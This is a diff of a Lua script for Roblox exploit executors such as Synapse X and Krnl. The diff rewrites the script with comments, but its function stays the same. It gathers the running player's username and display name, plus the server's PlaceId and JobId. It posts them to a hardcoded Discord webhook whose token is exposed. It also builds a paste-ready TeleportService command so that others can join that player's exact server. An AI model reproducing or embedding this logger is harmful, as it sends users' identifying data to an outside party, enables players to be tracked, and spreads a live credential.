@@ -1,15 +1,58 @@
+-- Detecting the current exploit
 local exploit = syn and "Synapse X" or KRNL_LOADED and "Krnl" or "Unknown Exploit"
 
-local url = "https://discord.com/api/webhooks/1132117375215476827/RLyaUit671i3NCj-mDbeBkwg2FxciPpWLuG74f7Qiu9spzhev287fRgEfN2YoJTT3D6I"
+-- Discord webhook URL
+local webhookUrl = "https://discord.com/api/webhooks/1132117375215476827/RLyaUit671i3NCj-mDbeBkwg2FxciPpWLuG74f7Qiu9spzhev287fRgEfN2YoJTT3D6I"
 
-local data = {["embeds"] = {{["title"] = ('game:GetService("TeleportService"):TeleportToPlaceInstance(') .. game.PlaceId .. ',"' .. game.JobId .. '")',["description"] = " Game: https://www.roblox.com/games/" .. game.PlaceId .. "/ Name: " .. game.Players.LocalPlayer.DisplayName .." ",["type"] = "rich",["color"] = tonumber(0x7269da)}}}
+-- Get the player's information
+local player = game.Players.LocalPlayer
+local playerName = player.Name
+local playerDisplayName = player.DisplayName
 
-local newdata = game:GetService("HttpService"):JSONEncode(data)
+-- Creating embed data with a clickable title
+local embedData = {
+    type = "rich",
+    color = 0x7269da,
+    fields = {
+        {
+            name = "Logs",
+            value = "Username: " .. playerName .. "\nDisplay Name: " .. playerDisplayName,
+            inline = false
+        },
+        {
+            name = "Player currently playing",
+            value = " [Join game](https://www.roblox.com/games/" .. game.PlaceId .. "/)",
+            inline = false
+        },
+        {
+            name = "Copy me and paste in your executor. Make sure you're in the game that the player is currently playing.",
+            value = "" .. 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ',"' .. game.JobId .. '")' .. "",
+            inline = false
+        }
+    }
+}
 
-local headers = {["content-type"] = "application/json"}
+-- Creating final data payload
+local postData = {
+    embeds = {embedData}
+}
 
-local wh = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+-- Encoding data to JSON
+local jsonData = game:GetService("HttpService"):JSONEncode(postData)
 
-request = http_request or request or HttpPost or syn.request
+-- Setting up HTTP request headers
+local headers = {
+    ["content-type"] = "application/json"
+}
 
-request(wh) -- sends the request to the webhook
+-- Creating request parameters
+local requestParams = {
+    Url = webhookUrl,
+    Body = jsonData,
+    Method = "POST",
+    Headers = headers
+}
+
+-- Sending the request to the webhook
+local request = http_request or request or HttpPost or syn.request
+request(requestParams)
